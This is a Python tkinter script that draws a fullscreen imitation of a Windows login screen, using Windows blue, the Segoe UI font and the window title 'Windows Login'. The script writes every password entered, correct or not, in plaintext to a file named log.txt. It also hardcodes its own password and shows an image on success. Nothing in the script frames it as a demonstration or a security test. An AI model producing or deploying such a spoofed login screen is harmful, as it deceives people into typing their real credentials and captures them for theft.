
import tkinter as tk
from tkinter import messagebox
from PIL import ImageTk, Image
import os

PASSWORD = "11223344"

def login():
    pwd = entry.get()
    with open("log.txt", "a") as f:
        f.write(f"Entered Password: {pwd}\n")
    if pwd == PASSWORD:
        root.destroy()
        show_image()
    else:
        messagebox.showerror("Login Failed", "Incorrect Password")

def show_image():
    img_window = tk.Tk()
    img_window.title("Welcome")
    img_window.attributes("-fullscreen", True)

    img = Image.open("login_success_image.jpg")
    screen_width = img_window.winfo_screenwidth()
    screen_height = img_window.winfo_screenheight()
    img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
    img = ImageTk.PhotoImage(img)

    lbl = tk.Label(img_window, image=img)
    lbl.image = img  # keep a reference!
    lbl.pack()
    img_window.bind("<Escape>", lambda e: img_window.destroy())  # Press ESC to exit
    img_window.mainloop()

root = tk.Tk()
root.title("Windows Login")
root.attributes("-fullscreen", True)

bg_color = "#0078D7"
root.configure(bg=bg_color)

tk.Label(root, text="Welcome", fg="white", bg=bg_color, font=("Segoe UI", 32)).pack(pady=80)
entry = tk.Entry(root, show="*", font=("Segoe UI", 20), width=30)
entry.pack(pady=20)
tk.Button(root, text="Login", font=("Segoe UI", 18), command=login).pack(pady=20)

root.bind("<Return>", lambda e: login())
root.mainloop()
